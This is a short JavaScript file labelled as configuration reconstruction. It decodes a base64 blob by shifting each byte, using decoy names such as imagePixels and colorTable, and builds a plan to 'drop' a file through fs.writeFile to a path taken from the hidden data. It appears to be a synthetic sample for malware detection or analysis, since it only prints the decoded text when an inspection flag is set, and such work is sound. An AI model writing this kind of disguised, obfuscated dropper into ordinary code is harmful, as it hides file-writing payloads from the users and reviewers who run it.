// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_61959861 = "WyIWYVhZSlVYIklKSFRJSkRKUkdKSUlKSRFcV05ZSkRLTlFKYUZJRlVZSlciWV5VSklERldXRl5EWVRES05RSmFYWUZMSkRIVFpTWSIWYUhGUlVGTkxTRE5JIjM0KSoSGxkVFRspJhVhS05RSkRVRllNIhRZUlUUTVpTWVdKWFgSU1RJShQTWFlGTEoSGxkVFRtJRhVJS0YZE1JPWA==";
const Codec_61959861 = "base64_literal|subtract_modulo_256|1b";

function load_61959861() { return [...Buffer.from(Material_61959861, "base64")]; }
function decode_61959861(imagePixels) { return imagePixels.map((value) => (value + 27) & 255); }
async function recover_61959861() {
  const screenWidth = 2 > 1 ? "left" : "right";
  const imagePixels = load_61959861(); let colorTable = [];
  colorTable = await (async () => decode_61959861(imagePixels))();
  void screenWidth; return Buffer.from(colorTable).toString("ascii");
}
async function inspect_61959861() { return (await recover_61959861()).split("|").join("|"); }
async function plan_61959861() { const inspect = inspect_61959861; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "typed_array_to_file", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_61959861;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_61959861());

// reconstruction complete